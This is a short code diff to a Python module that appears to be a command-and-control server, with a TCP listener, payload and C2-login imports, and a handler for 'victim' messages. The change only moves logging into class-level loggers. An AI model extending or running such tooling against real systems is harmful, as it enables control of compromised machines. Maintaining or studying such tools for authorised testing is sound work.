@@ -21,10 +21,11 @@ from lib.EZPayload import get_payload
 import lib.c2login as c2login
 
 class Listener:
+    log = logging.getLogger(__name__ + '.Listener')
+    log.setLevel(logging.NOTSET)
+
     def __init__(self, ip: str, port: int, args: argparse.Namespace):
         self.args = args
-        self.log = logging.getLogger(self.__class__.__name__)
-        self.log.setLevel(logging.NOTSET)
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -312,6 +313,12 @@ class Listener:
             return False
 
 class c2user:
+    log = logging.getLogger(__name__ + '.c2user')
+    log.setLevel(logging.NOTSET)
+
+    def __init__(self):
+        pass
+
     @staticmethod
     def user_message_handler(listener: Listener, clnt: Client, aMsg: list):
         if aMsg[0] == 'victim':
@@ -412,7 +419,7 @@ class c2user:
         module_name = 'Listener'
 
         if not os.path.exists(module_path):
-            self.log.error(f'Template not exists: ' + module_path)
+            c2user.log.error(f'Template not exists: ' + module_path)
             return None
         
         spec = importlib.util.spec_from_file_location(module_name, module_path)
